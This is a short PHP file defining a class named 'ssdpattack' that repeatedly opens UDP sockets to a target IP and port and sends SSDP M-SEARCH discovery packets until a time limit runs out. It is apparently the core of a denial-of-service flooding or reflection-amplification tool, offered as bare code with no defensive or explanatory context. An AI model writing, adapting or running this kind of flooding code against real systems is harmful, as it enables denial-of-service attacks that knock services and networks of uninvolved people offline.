<?php
class ssdpattack{
	function ssdpattack($ip, $port, $starttime, $max_time, $exec_time){
		while(1){ 
			try{
				$packets++;
					if(time() > $max_time){
						output($packets, $starttime, $exec_time, $lenght);
						break; 
					}
				$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
				socket_connect($sock, $ip, $port);
				$data = 'M-SEARCH * HTTP/1.1\r\n';
				$data .= 'HOST: 239.255.255.250:1900\r\n';
		        $data .= 'MAN: "ssdp:discover"\r\n';
		        $data .= 'MX: 2\r\n';
		        $data .= 'ST: ssdp:all\r\n\r\n';
				socket_send($sock, $data, strlen($data), 0);
			}catch (Exception $e){
				echo $e;
			}
		}
	}
}
?>